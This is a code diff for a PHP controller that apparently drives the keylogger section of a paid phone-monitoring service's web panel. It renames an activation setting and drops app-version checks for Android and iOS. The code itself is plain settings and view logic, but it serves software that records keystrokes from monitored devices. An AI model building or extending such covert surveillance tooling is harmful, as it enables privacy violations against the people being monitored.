@@ -38,17 +38,12 @@ class Keylogger extends BaseModuleController
             $this->makeJSONResponse($data);
         }
 
-        if (($this->di['currentDevice']['os'] === 'android' && $this->di['currentDevice']['app_version'] > 6) ||
-            ($this->di['currentDevice']['os'] === 'ios' && $this->di['currentDevice']['app_version'] > 5)) {
-            $this->view->serviceKeylogger = (int)$settings['keylogger_activate'];
-        }
-        
         if ($this->view->paid) {
             if(!$keyloggerModel->hasRecords($this->di['devId']) 
-                    && isset($settings['keylogger_activate']) && !(int)$settings['keylogger_activate']) {
+                    && isset($settings['keylogger_enabled']) && !(int)$settings['keylogger_enabled']) {
                 return $this->setView('cp/keylogger/activation.htm');
             }
-            
+            $this->view->serviceKeylogger = $settings['keylogger_enabled'];
             $this->view->hasRecords = $keyloggerModel->hasRecords($this->di['devId']);
         }
 
@@ -60,7 +55,7 @@ class Keylogger extends BaseModuleController
         $settingsModel = new \Models\Cp\Settings($this->di);
         $settings = $settingsModel->getDeviceSettings($this->di['devId']);
 
-        if ($settings['keylogger_enabled'] || $settings['keylogger_activate']) {
+        if ($settings['keylogger_enabled']) {
             $keyloggerModel = new \Models\Cp\Keylogger($this->di);
             $settingsModel = new \Models\Cp\Settings($this->di);
             $settings = $settingsModel->getDeviceSettings($this->di['devId']);
@@ -75,17 +70,13 @@ class Keylogger extends BaseModuleController
                 $this->makeJSONResponse($data);
             }
 
-            if (($this->di['currentDevice']['os'] === 'android' && $this->di['currentDevice']['app_version'] > 6) ||
-            ($this->di['currentDevice']['os'] === 'ios' && $this->di['currentDevice']['app_version'] > 5)) {
-                $this->view->serviceKeylogger = (int)$settings['keylogger_activate'];
-            }
             
             if ($this->view->paid) {
                 if(!$keyloggerModel->hasRecords($this->di['devId']) 
-                    && isset($settings['keylogger_activate']) && !(int)$settings['keylogger_activate']) {
+                    && isset($settings['keylogger_enabled']) && !(int)$settings['keylogger_enabled']) {
                     $this->setView('cp/keylogger/activation.htm');die();
                 }
-                
+                $this->view->serviceKeylogger = $settings['keylogger_enabled'];
                 $this->view->hasRecords = $keyloggerModel->hasRecords($this->di['devId']);
             }
 
